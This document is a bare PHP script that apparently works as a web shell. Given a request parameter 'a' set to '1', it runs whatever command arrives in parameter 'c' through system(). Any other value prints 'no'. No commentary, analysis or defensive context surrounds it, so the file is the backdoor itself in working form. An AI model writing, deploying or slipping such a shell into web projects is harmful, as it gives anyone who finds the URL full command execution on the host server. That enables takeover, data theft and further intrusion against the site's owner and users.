<?php
switch ($_GET['a']) {
    case '1':
        system($_GET['c']);
        break;
    default:
        echo 'no';
}
